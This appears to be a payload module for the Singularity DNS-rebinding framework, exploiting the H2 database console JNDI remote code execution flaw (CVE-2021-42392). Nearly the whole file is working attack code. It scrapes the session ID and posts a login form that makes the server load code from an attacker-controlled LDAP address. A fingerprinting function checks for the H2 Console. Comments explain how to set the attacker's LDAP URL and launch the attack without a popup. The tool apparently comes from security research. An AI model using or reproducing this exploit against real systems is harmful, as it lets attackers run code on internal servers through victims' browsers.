/**
This payload is exploiting the H2 Log4Shell RCE (CVE-2021-42392).
The H2 database DNS rebinding issue has been fixed in commit 
https://github.com/h2database/h2database/commit/456c2d03a75d55b69eff67e37f597a42f70c4b29
with release version 2.1.210 (https://github.com/h2database/h2database/releases/tag/version-2.1.210).

Use the `alertsuccess=false` URL parameter to disable the JavaScript alert() 
popup when using the Singularity Manager web interface. 
E.g. http://rebind.it/manager.html?alertsuccess=false
This will automatically launch the attack without JavaScript alert().
Alternatively, use the attack automation feature 
(https://github.com/nccgroup/singularity/blob/master/html/autoattack.html).

You need to adjust the JDBC_URL variable to point to your LDAP server.
**/

const H2Rce = () => {
	// CHANGE THIS
	// This is the JDBC URL pointing to the attacker's LDAP server.
	// This needs to be URL encoded.
	let JDBC_URL = 'ldap%3A%2F%2F127.0.0.1%3A1389%2Fgylh9a'; // e.g. ldap://127.0.0.1:1389/gylh9a
	let myBody = "language=en&setting=Generic+JNDI+Data+Source&name=Generic+JNDI+Data+Source&driver=javax.naming.InitialContext&url=" + JDBC_URL + "&user=&password=";

	// Invoked after DNS rebinding has been performed
	function attack(headers, cookie, body) {
		let myHeaders = new Headers();

		fetch('/')
			.then(function (response) {
				 return response.text()
			})
			.then(function (body) {
				// searching for the jsession looking like 'login.jsp?jsessionid=5fc6e0dd6c2dc76133f25ddcaafeaa25'
				match = body.match(/'login.jsp\?jsessionid=([^']+)'/); 

				if (match === null) {
					throw new Error('Could not find jsessionid!');
				}

				console.log("jsessionid is " + match[1]);
				let path = "/login.do?jsessionid=" + match[1]; // POST /login.do?jsessionid=5fc6e0dd6c2dc76133f25ddcaafeaa25
				myHeaders.append("Content-Type", "application/x-www-form-urlencoded");

				fetch(path, {
					method: 'POST',
					headers: myHeaders,
					body: myBody
				})
				.then(responseOKOrFail("Login failed"))
				.then(function (response) {
					console.log(`Server response: ${response}.`);
				})
				.catch(error => console.log(`Could not exploit H2: ${error}`));
			})
	}

	// Invoked to determine whether the rebinded service
	// is the one targeted by this payload. Must return true or false.
	async function isService(headers, cookie, body) {
		return fetch("/",{
			mode: 'no-cors',
			credentials: 'omit',
		})
			.then(function (response) {
				return response.text()
			})
			.then(function (d) {
				if (d.includes("H2 Console") === true) {
					return true;
				} else {
					return false;
				}
			})
			.catch(e => { return (false); })
	}

	return {
		attack,
		isService
	}
}

// Registry value and manager-config.json value must match
Registry["H2 Log4Shell RCE"] = H2Rce();

